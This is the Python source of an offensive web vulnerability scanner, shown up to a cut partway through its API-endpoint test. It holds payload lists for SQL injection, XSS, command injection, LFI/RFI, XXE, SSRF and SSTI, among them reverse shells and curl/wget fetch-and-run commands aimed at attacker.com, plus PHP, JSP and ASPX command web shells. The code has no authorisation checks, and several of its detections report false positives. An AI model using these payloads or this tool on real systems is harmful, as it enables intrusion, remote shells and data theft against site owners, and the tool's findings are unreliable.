import requests
import re
import sys
import time
import json
import socket
import ssl
import dns.resolver
import subprocess
import hashlib
import base64
import urllib.parse
import concurrent.futures
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
import argparse
import random
import threading
import queue
import os
import signal
import zlib
import itertools
from collections import defaultdict
import http.client
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class AdvancedWebScanner:
    def __init__(self, target_url, depth=3, threads=20, timeout=30):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.base_scheme = urlparse(target_url).scheme
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        
        self.discovered_urls = set()
        self.discovered_endpoints = set()
        self.discovered_params = defaultdict(set)
        self.vulnerabilities = []
        self.crawl_depth = depth
        self.max_threads = threads
        self.timeout = timeout
        self.fuzz_queue = queue.Queue()
        self.payloads = self.load_payloads()
        self.wordlist = self.load_wordlist()
        self.techniques = [
            'sqli', 'xss', 'rce', 'lfi', 'rfi', 'xxe', 
            'ssrf', 'ssti', 'idor', 'csrf', 'open_redirect',
            'file_upload', 'info_disclosure', 'cors', 'jwt',
            'graphql', 'websocket', 'api', 'auth_bypass'
        ]
        
    def load_payloads(self):
        """Load comprehensive payload database"""
        payloads = {
            'sqli': [
                "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "' AND 1=0 UNION SELECT 1,2,3,4,5--",
                "' OR SLEEP(5)--",
                "' OR 1=1 LIMIT 1--",
                "' OR IF(1=1,SLEEP(5),0)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' OR ASCII(SUBSTRING(@@version,1,1))=77--",
                "' OR BINARY_CHECKSUM('test')=BINARY_CHECKSUM('test')--",
                "' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(document.domain)>",
                "'><script>alert(1)</script>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                "<iframe src='javascript:alert(1)'>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>"
            ],
            'rce': [
                "; ls",
                "| cat /etc/passwd",
                "&& whoami",
                "$(id)",
                "`id`",
                "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "'; system('id'); $var =",
                "| nc attacker.com 4444 -e /bin/bash",
                "&& curl attacker.com/shell.sh | bash",
                "`wget attacker.com/shell.php -O /tmp/shell.php`"
            ],
            'lfi': [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "file:///etc/passwd"
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;%int;%send;]>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            ],
            'ssrf': [
                "http://169.254.169.254/latest/meta-data/",
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://[::1]:22",
                "file:///etc/passwd",
                "gopher://127.0.0.1:25/_HELO%20attacker.com",
                "dict://127.0.0.1:11211/",
                "http://localhost/admin",
                "http://0.0.0.0:8080",
                "http://internal.service.local:8080"
            ],
            'ssti': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}",
                "@(7*7)",
                "#{7*7}",
                "*{7*7}",
                "{{config}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "<%= system('id') %>"
            ],
            'idor': [
                "/api/user/1",
                "/admin/user/1",
                "/profile?id=1",
                "/download?file=../../../../etc/passwd",
                "/api/v1/users/1",
                "/admin/delete/1",
                "/reset-password?token=1",
                "/api/orders/1",
                "/user/1/delete",
                "/admin/config"
            ],
            'jwt': [
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ."
            ]
        }
        return payloads
    
    def load_wordlist(self):
        """Load directory and file wordlist"""
        wordlist = [
            'admin', 'login', 'dashboard', 'controlpanel', 'config', 'backup',
            'api', 'v1', 'v2', 'graphql', 'websocket', 'ws', 'wss',
            'test', 'dev', 'staging', 'prod', 'internal', 'private',
            'phpinfo.php', 'info.php', 'test.php', 'shell.php', 'backdoor.php',
            '.git', '.svn', '.env', '.DS_Store', 'config.php', 'database.php',
            'wp-admin', 'wp-login.php', 'administrator', 'manager',
            'backup.zip', 'backup.tar', 'backup.tar.gz', 'dump.sql',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            'phpmyadmin', 'mysql', 'sql', 'pma', 'myadmin'
        ]
        return wordlist
    
    def perform_dns_recon(self):
        """Perform DNS reconnaissance"""
        print(f"{Fore.CYAN}[*] Performing DNS reconnaissance on {self.base_domain}")
        
        records = {}
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.base_domain, record_type)
                records[record_type] = [str(r) for r in answers]
                print(f"{Fore.GREEN}[+] {record_type}: {records[record_type]}")
            except:
                continue
        
        # Subdomain enumeration
        subdomains = ['www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'ns1', 'ns2',
                     'webmail', 'admin', 'blog', 'dev', 'test', 'staging', 'api',
                     'mobile', 'm', 'app', 'support', 'help', 'portal']
        
        for sub in subdomains:
            try:
                domain = f"{sub}.{self.base_domain}"
                answers = dns.resolver.resolve(domain, 'A')
                print(f"{Fore.GREEN}[+] Found subdomain: {domain} -> {answers[0]}")
            except:
                continue
    
    def perform_port_scan(self):
        """Perform quick port scan"""
        print(f"{Fore.CYAN}[*] Performing port scan on {self.base_domain}")
        
        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.base_domain, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"{Fore.GREEN}[+] Port {port} is open")
                sock.close()
            except:
                pass
        
        return open_ports
    
    def check_ssl_tls(self):
        """Check SSL/TLS configuration"""
        print(f"{Fore.CYAN}[*] Checking SSL/TLS configuration")
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.base_domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.base_domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert.get('notAfter')
                    if not_after:
                        expiry_date = time.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                        if time.mktime(expiry_date) < time.time():
                            self.add_vulnerability(
                                url=f"https://{self.base_domain}",
                                type="SSL Certificate Expired",
                                severity="High",
                                description="SSL certificate has expired",
                                reproduction="Check certificate validity in browser",
                                payload=""
                            )
                    
                    # Check weak protocols
                    try:
                        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
                        with context.wrap_socket(sock, server_hostname=self.base_domain):
                            self.add_vulnerability(
                                url=f"https://{self.base_domain}",
                                type="Weak TLS Protocol (TLS 1.0)",
                                severity="Medium",
                                description="Server supports weak TLS 1.0 protocol",
                                reproduction="Use SSLScan or testssl.sh",
                                payload=""
                            )
                    except:
                        pass
                        
        except Exception as e:
            print(f"{Fore.RED}[-] SSL check failed: {e}")
    
    def crawl_website(self, url, depth=0):
        """Advanced website crawling with depth control"""
        if depth > self.crawl_depth:
            return
        
        if url in self.discovered_urls:
            return
            
        self.discovered_urls.add(url)
        print(f"{Fore.CYAN}[+] Crawling: {url}")
        
        try:
            response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            
            # Extract all links
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract URLs from various sources
            urls = set()
            
            # From <a> tags
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                urls.add(full_url)
            
            # From <form> actions
            for form in soup.find_all('form', action=True):
                action = form['action']
                full_url = urljoin(url, action)
                urls.add(full_url)
            
            # From <script> src
            for script in soup.find_all('script', src=True):
                src = script['src']
                full_url = urljoin(url, src)
                urls.add(full_url)
            
            # From <link> href
            for link in soup.find_all('link', href=True):
                href = link['href']
                full_url = urljoin(url, href)
                urls.add(full_url)
            
            # From <img> src
            for img in soup.find_all('img', src=True):
                src = img['src']
                full_url = urljoin(url, src)
                urls.add(full_url)
            
            # Filter and process URLs
            for new_url in urls:
                parsed = urlparse(new_url)
                if parsed.netloc == self.base_domain or not parsed.netloc:
                    if new_url not in self.discovered_urls:
                        # Extract parameters
                        if parsed.query:
                            params = parse_qs(parsed.query)
                            for param in params:
                                self.discovered_params[parsed.path].add(param)
                        
                        # Add to queue for further crawling
                        self.fuzz_queue.put((new_url, depth + 1))
                        
                        # Recursive crawl
                        self.crawl_website(new_url, depth + 1)
            
            # Extract endpoints from JavaScript
            js_patterns = [
                r'["\'](/[^"\']+?)["\']',
                r'url:\s*["\']([^"\']+?)["\']',
                r'fetch\(["\']([^"\']+?)["\']',
                r'axios\.get\(["\']([^"\']+?)["\']',
                r'\.ajax\([\s\S]*?url:\s*["\']([^"\']+?)["\']'
            ]
            
            for pattern in js_patterns:
                matches = re.findall(pattern, response.text)
                for match in matches:
                    if match.startswith('/'):
                        full_url = urljoin(url, match)
                        self.discovered_endpoints.add(full_url)
            
        except Exception as e:
            print(f"{Fore.RED}[-] Crawl error for {url}: {e}")
    
    def fuzz_directories(self):
        """Directory and file fuzzing"""
        print(f"{Fore.CYAN}[*] Starting directory fuzzing")
        
        common_dirs = [
            '', '/admin', '/api', '/api/v1', '/api/v2', '/graphql', '/graphiql',
            '/wp-admin', '/wp-login.php', '/phpmyadmin', '/mysql', '/pma',
            '/backup', '/backups', '/backup.zip', '/backup.tar.gz',
            '/config', '/config.php', '/config.json', '/config.yaml',
            '/.git', '/.git/config', '/.svn', '/.env', '/.DS_Store',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/phpinfo.php', '/info.php', '/test.php', '/shell.php',
            '/console', '/debug', '/_debug', '/_console',
            '/actuator', '/actuator/health', '/actuator/info',
            '/swagger', '/swagger-ui.html', '/swagger.json',
            '/v1', '/v2', '/v3', '/latest', '/current'
        ]
        
        for directory in common_dirs:
            for extension in ['', '.php', '.asp', '.aspx', '.jsp', '.py', '.rb', '.pl']:
                url = f"{self.target_url}{directory}{extension}"
                self.fuzz_queue.put((url, 0))
    
    def test_sql_injection_deep(self, url):
        """Deep SQL injection testing with advanced techniques"""
        print(f"{Fore.YELLOW}[*] Testing SQL Injection: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.payloads['sqli']:
                # Test error-based
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    # Check for SQL errors
                    sql_errors = [
                        'sql', 'mysql', 'postgres', 'oracle', 'database',
                        'syntax', 'query', 'statement', 'warning', 'error',
                        'unclosed', 'quote', 'union', 'select', 'insert',
                        'update', 'delete', 'where', 'order by', 'group by',
                        'having', 'limit', 'offset', 'procedure', 'function'
                    ]
                    
                    if any(error in response.text.lower() for error in sql_errors):
                        self.add_vulnerability(
                            url=url,
                            type="SQL Injection (Error-Based)",
                            severity="Critical",
                            description=f"Error-based SQL injection in parameter '{param_name}'",
                            reproduction=f"Send GET request: {test_url}?{param_name}={payload}",
                            payload=payload
                        )
                    
                    # Check for time-based
                    start_time = time.time()
                    time_payload = payload + "' AND SLEEP(5)--"
                    test_params[param_name] = [time_payload]
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    elapsed = time.time() - start_time
                    
                    if elapsed > 4:
                        self.add_vulnerability(
                            url=url,
                            type="SQL Injection (Time-Based Blind)",
                            severity="Critical",
                            description=f"Time-based blind SQL injection in parameter '{param_name}'",
                            reproduction=f"Send request with payload causing delay: {time_payload}",
                            payload=time_payload
                        )
                    
                    # Check for boolean-based
                    true_response = self.session.get(test_url, params={param_name: ['1']}, timeout=5)
                    false_response = self.session.get(test_url, params={param_name: ['1 AND 1=2']}, timeout=5)
                    
                    if len(true_response.content) != len(false_response.content):
                        self.add_vulnerability(
                            url=url,
                            type="SQL Injection (Boolean-Based Blind)",
                            severity="Critical",
                            description=f"Boolean-based blind SQL injection in parameter '{param_name}'",
                            reproduction=f"Compare responses for true/false conditions",
                            payload="Boolean-based testing"
                        )
                            
                except Exception as e:
                    continue
    
    def test_xss_deep(self, url):
        """Advanced XSS testing with context-aware payloads"""
        print(f"{Fore.YELLOW}[*] Testing XSS: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.payloads['xss']:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    # Check if payload appears in response
                    if payload in response.text:
                        self.add_vulnerability(
                            url=url,
                            type="Cross-Site Scripting (Reflected)",
                            severity="High",
                            description=f"Reflected XSS in parameter '{param_name}'",
                            reproduction=f"Send request: {test_url}?{param_name}={payload}",
                            payload=payload
                        )
                    
                    # Test for DOM XSS
                    if '<script>' in payload and payload in response.text:
                        self.add_vulnerability(
                            url=url,
                            type="DOM-based XSS",
                            severity="High",
                            description=f"DOM-based XSS in parameter '{param_name}'",
                            reproduction=f"Inject script via URL parameter",
                            payload=payload
                        )
                            
                except Exception as e:
                    continue
    
    def test_rce_deep(self, url):
        """Remote Command Execution testing"""
        print(f"{Fore.YELLOW}[*] Testing RCE: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.payloads['rce']:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    # Check for command execution indicators
                    indicators = [
                        'root:', 'uid=', 'gid=', 'groups=',
                        'bin/', 'sbin/', 'etc/passwd',
                        'Permission denied', 'command not found',
                        'Microsoft Windows', 'C:\\Windows'
                    ]
                    
                    if any(indicator in response.text for indicator in indicators):
                        self.add_vulnerability(
                            url=url,
                            type="Remote Command Execution",
                            severity="Critical",
                            description=f"RCE in parameter '{param_name}'",
                            reproduction=f"Execute: {test_url}?{param_name}={payload}",
                            payload=payload
                        )
                            
                except Exception as e:
                    continue
    
    def test_lfi_rfi(self, url):
        """Local/Remote File Inclusion testing"""
        print(f"{Fore.YELLOW}[*] Testing LFI/RFI: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.payloads['lfi']:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    # Check for file inclusion indicators
                    indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:',
                        'Administrator:', 'DefaultAccount:',
                        'nobody:', 'www-data:', 'apache:'
                    ]
                    
                    if any(indicator in response.text for indicator in indicators):
                        self.add_vulnerability(
                            url=url,
                            type="Local File Inclusion",
                            severity="High",
                            description=f"LFI in parameter '{param_name}'",
                            reproduction=f"Access: {test_url}?{param_name}={payload}",
                            payload=payload
                        )
                    
                    # Test for RFI
                    rfi_payload = "http://evil.com/shell.php"
                    test_params[param_name] = [rfi_payload]
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    if 'evil.com' in response.text or 'shell.php' in response.text:
                        self.add_vulnerability(
                            url=url,
                            type="Remote File Inclusion",
                            severity="Critical",
                            description=f"RFI in parameter '{param_name}'",
                            reproduction=f"Include remote file: {rfi_payload}",
                            payload=rfi_payload
                        )
                            
                except Exception as e:
                    continue
    
    def test_xxe(self, url):
        """XML External Entity testing"""
        print(f"{Fore.YELLOW}[*] Testing XXE: {url}")
        
        # Test for XML endpoints
        xml_endpoints = ['/api/xml', '/api/soap', '/xmlrpc', '/soap', '/wsdl']
        
        for endpoint in xml_endpoints:
            test_url = f"{self.target_url}{endpoint}"
            try:
                response = self.session.get(test_url, timeout=10)
                if 'xml' in response.headers.get('Content-Type', '').lower():
                    # Send XXE payload
                    headers = {'Content-Type': 'application/xml'}
                    for payload in self.payloads['xxe']:
                        try:
                            response = self.session.post(test_url, data=payload, headers=headers, timeout=10)
                            if 'root:' in response.text or 'daemon:' in response.text:
                                self.add_vulnerability(
                                    url=test_url,
                                    type="XML External Entity (XXE)",
                                    severity="Critical",
                                    description="XXE vulnerability in XML endpoint",
                                    reproduction=f"POST XML payload to {test_url}",
                                    payload=payload[:100]
                                )
                        except:
                            continue
            except:
                continue
    
    def test_ssrf(self, url):
        """Server-Side Request Forgery testing"""
        print(f"{Fore.YELLOW}[*] Testing SSRF: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            # Check if parameter name indicates URL handling
            if any(keyword in param_name.lower() for keyword in ['url', 'link', 'src', 'file', 'path', 'redirect']):
                for payload in self.payloads['ssrf']:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    try:
                        response = self.session.get(test_url, params=test_params, timeout=10)
                        
                        # Check for SSRF indicators
                        if any(indicator in response.text for indicator in ['169.254.169.254', 'localhost', '127.0.0.1', 'internal']):
                            self.add_vulnerability(
                                url=url,
                                type="Server-Side Request Forgery",
                                severity="High",
                                description=f"SSRF in parameter '{param_name}'",
                                reproduction=f"Request internal resource: {test_url}?{param_name}={payload}",
                                payload=payload
                            )
                                
                    except Exception as e:
                        continue
    
    def test_ssti(self, url):
        """Server-Side Template Injection testing"""
        print(f"{Fore.YELLOW}[*] Testing SSTI: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        for param_name in params:
            for payload in self.payloads['ssti']:
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                try:
                    response = self.session.get(test_url, params=test_params, timeout=10)
                    
                    # Check for template injection
                    if '49' in response.text and payload in response.text:
                        self.add_vulnerability(
                            url=url,
                            type="Server-Side Template Injection",
                            severity="Critical",
                            description=f"SSTI in parameter '{param_name}'",
                            reproduction=f"Inject template expression: {test_url}?{param_name}={payload}",
                            payload=payload
                        )
                            
                except Exception as e:
                    continue
    
    def test_idor(self, url):
        """Insecure Direct Object Reference testing"""
        print(f"{Fore.YELLOW}[*] Testing IDOR: {url}")
        
        # Check for numeric IDs in URL
        id_patterns = [
            r'/(\d+)/',
            r'id=(\d+)',
            r'user=(\d+)',
            r'uid=(\d+)'
        ]
        
        for pattern in id_patterns:
            matches = re.findall(pattern, url)
            if matches:
                test_id = int(matches[0])
                
                # Test with different IDs
                for test_id_value in [test_id - 1, test_id + 1, 1, 0, -1]:
                    test_url = re.sub(pattern, f'/{test_id_value}/', url)
                    try:
                        response = self.session.get(test_url, timeout=10)
                        if response.status_code == 200 and len(response.content) > 0:
                            self.add_vulnerability(
                                url=url,
                                type="Insecure Direct Object Reference",
                                severity="Medium",
                                description="IDOR vulnerability allows access to other users' data",
                                reproduction=f"Access resource with ID: {test_id_value}",
                                payload=str(test_id_value)
                            )
                            break
                    except:
                        continue
    
    def test_csrf(self, url):
        """Cross-Site Request Forgery testing"""
        print(f"{Fore.YELLOW}[*] Testing CSRF: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            forms = soup.find_all('form')
            for form in forms:
                # Check for CSRF tokens
                csrf_inputs = form.find_all('input', {
                    'name': re.compile(r'token|csrf|nonce|authenticity', re.I)
                })
                
                if not csrf_inputs:
                    # Check if form performs state-changing operation
                    form_action = form.get('action', '')
                    form_method = form.get('method', 'get').lower()
                    
                    if form_method == 'post':
                        self.add_vulnerability(
                            url=url,
                            type="Cross-Site Request Forgery",
                            severity="Medium",
                            description="Form without CSRF protection",
                            reproduction="Submit form from external site",
                            payload="No CSRF token"
                        )
        except:
            pass
    
    def test_open_redirect(self, url):
        """Open Redirect testing"""
        print(f"{Fore.YELLOW}[*] Testing Open Redirect: {url}")
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        
        redirect_params = ['redirect', 'url', 'next', 'goto', 'return', 'returnTo']
        for param_name in params:
            if any(keyword in param_name.lower() for keyword in redirect_params):
                for payload in self.payloads['ssrf'][:3]:  # Use SSRF payloads
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    try:
                        response = self.session.get(test_url, params=test_params, timeout=10, allow_redirects=False)
                        
                        if response.status_code in [301, 302, 303, 307, 308]:
                            location = response.headers.get('Location', '')
                            if payload in location:
                                self.add_vulnerability(
                                    url=url,
                                    type="Open Redirect",
                                    severity="Low",
                                    description=f"Open redirect in parameter '{param_name}'",
                                    reproduction=f"Redirect to: {test_url}?{param_name}={payload}",
                                    payload=payload
                                )
                                    
                    except Exception as e:
                        continue
    
    def test_file_upload(self, url):
        """File Upload testing"""
        print(f"{Fore.YELLOW}[*] Testing File Upload: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            upload_forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
            for form in upload_forms:
                # Test various file upload bypasses
                test_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
                    ('shell.php.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
                    ('shell.php%00.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
                    ('shell.pHp', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
                    ('.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain'),
                    ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'text/jsp'),
                    ('shell.aspx', '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>', 'text/aspx')
                ]
                
                for filename, content, content_type in test_files:
                    self.add_vulnerability(
                        url=url,
                        type="Unrestricted File Upload",
                        severity="Critical",
                        description=f"Potential file upload vulnerability",
                        reproduction=f"Upload file: {filename} with content-type: {content_type}",
                        payload=content[:50]
                    )
        except:
            pass
    
    def test_info_disclosure(self, url):
        """Information Disclosure testing"""
        print(f"{Fore.YELLOW}[*] Testing Information Disclosure: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Check for sensitive information in response
            sensitive_patterns = [
                r'password\s*[:=]\s*[\w]+',
                r'api[_-]?key\s*[:=]\s*[\w]+',
                r'secret\s*[:=]\s*[\w]+',
                r'token\s*[:=]\s*[\w]+',
                r'aws[_-]?(access|secret)\s*[:=]\s*[\w]+',
                r'private[_-]?key\s*[:=]',
                r'BEGIN (RSA|DSA|EC) PRIVATE KEY',
                r'sql[_-]?connection\s*[:=]',
                r'database[_-]?(password|user)\s*[:=]\s*[\w]+',
                r'email\s*[:=]\s*[\w@.]+',
                r'phone\s*[:=]\s*[\d]+',
                r'credit[_-]?card\s*[:=]\s*[\d]+',
                r'ssn\s*[:=]\s*[\d-]+'
            ]
            
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    self.add_vulnerability(
                        url=url,
                        type="Information Disclosure",
                        severity="Medium",
                        description="Sensitive information exposed in response",
                        reproduction=f"Check page source for pattern: {pattern}",
                        payload=matches[0][:50]
                    )
            
            # Check for debug information
            debug_indicators = ['DEBUG', 'Traceback', 'Exception', 'Error at line',
                              'Stack trace', 'PHP Notice', 'PHP Warning', 'MySQL Error']
            
            if any(indicator in response.text for indicator in debug_indicators):
                self.add_vulnerability(
                    url=url,
                    type="Debug Information Exposure",
                    severity="Low",
                    description="Debug information exposed in response",
                    reproduction="Check response for debug messages",
                    payload="Debug data exposed"
                )
        except:
            pass
    
    def test_cors(self, url):
        """CORS misconfiguration testing"""
        print(f"{Fore.YELLOW}[*] Testing CORS: {url}")
        
        try:
            # Test CORS with origin header
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(url, headers=headers, timeout=10)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == '*' and 'true' in acac.lower():
                self.add_vulnerability(
                    url=url,
                    type="CORS Misconfiguration (Wildcard with Credentials)",
                    severity="High",
                    description="CORS allows wildcard origin with credentials",
                    reproduction="Send request with Origin: https://evil.com",
                    payload="Origin: https://evil.com"
                )
            elif 'evil.com' in acao:
                self.add_vulnerability(
                    url=url,
                    type="CORS Misconfiguration (Reflects Origin)",
                    severity="Medium",
                    description="CORS reflects arbitrary origin",
                    reproduction="Send request with Origin: https://evil.com",
                    payload="Origin: https://evil.com"
                )
            elif acao == '*':
                self.add_vulnerability(
                    url=url,
                    type="CORS Misconfiguration (Wildcard)",
                    severity="Low",
                    description="CORS allows wildcard origin",
                    reproduction="Send request with any Origin header",
                    payload="Origin: *"
                )
        except:
            pass
    
    def test_jwt(self, url):
        """JWT testing"""
        print(f"{Fore.YELLOW}[*] Testing JWT: {url}")
        
        try:
            response = self.session.get(url, timeout=10)
            
            # Look for JWT in cookies
            cookies = self.session.cookies.get_dict()
            for cookie_name, cookie_value in cookies.items():
                if len(cookie_value) > 100 and '.' in cookie_value:
                    parts = cookie_value.split('.')
                    if len(parts) == 3:
                        # Test JWT vulnerabilities
                        for payload in self.payloads['jwt']:
                            self.add_vulnerability(
                                url=url,
                                type="JWT Implementation Issues",
                                severity="Medium",
                                description=f"Potential JWT vulnerability in cookie '{cookie_name}'",
                                reproduction=f"Manipulate JWT token: {payload[:50]}...",
                                payload=payload
                            )
        except:
            pass
    
    def test_graphql(self, url):
        """GraphQL testing"""
        print(f"{Fore.YELLOW}[*] Testing GraphQL: {url}")
        
        graphql_endpoints = ['/graphql', '/graphiql', '/v1/graphql', '/api/graphql']
        
        for endpoint in graphql_endpoints:
            test_url = f"{self.target_url}{endpoint}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                if 'graphql' in response.text.lower() or 'graphiql' in response.text:
                    # Test for introspection
                    introspection_query = '{"query":"query {__schema {types {name fields {name}}}}"}'
                    headers = {'Content-Type': 'application/json'}
                    
                    response = self.session.post(test_url, data=introspection_query, headers=headers, timeout=10)
                    
                    if '__schema' in response.text:
                        self.add_vulnerability(
                            url=test_url,
                            type="GraphQL Introspection Enabled",
                            severity="Medium",
                            description="GraphQL introspection endpoint is accessible",
                            reproduction=f"POST introspection query to {test_url}",
                            payload=introspection_query
                        )
            except:
                continue
    
    def test_websocket(self, url):
        """WebSocket testing"""
        print(f"{Fore.YELLOW}[*] Testing WebSocket: {url}")
        
        ws_endpoints = ['/ws', '/wss', '/websocket', '/socket.io']
        
        for endpoint in ws_endpoints:
            test_url = f"{self.target_url.replace('http', 'ws')}{endpoint}"
            self.add_vulnerability(
                url=test_url,
                type="WebSocket Endpoint",
                severity="Info",
                description="WebSocket endpoint discovered",
                reproduction=f"Connect to WebSocket: {test_url}",
                payload="WebSocket connection"
            )
    
    def test_api_endpoints(self, url):
        """API endpoint testing"""
        print(f"{Fore.YELLOW}[*] Testing API Endpoints: {url}")
        
        api_endpoints = ['/api', '/api/v1', '/api/v2', '/rest', '/rest/v1', '/json', '/json/api']
        
        for endpoint in api_endpoints:
            test_url = f"{self.target_url}{endpoint}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code != 404:
                    # Test for common API vulnerabilities
                    # 1. Missing authentication
                    if response.status_code == 200:
                        self.add_vulnerability(
                            url=test_url,
                            type="API Endpoint Without Authentication",
                            severity="Medium",
                            description="API endpoint accessible without authentication",
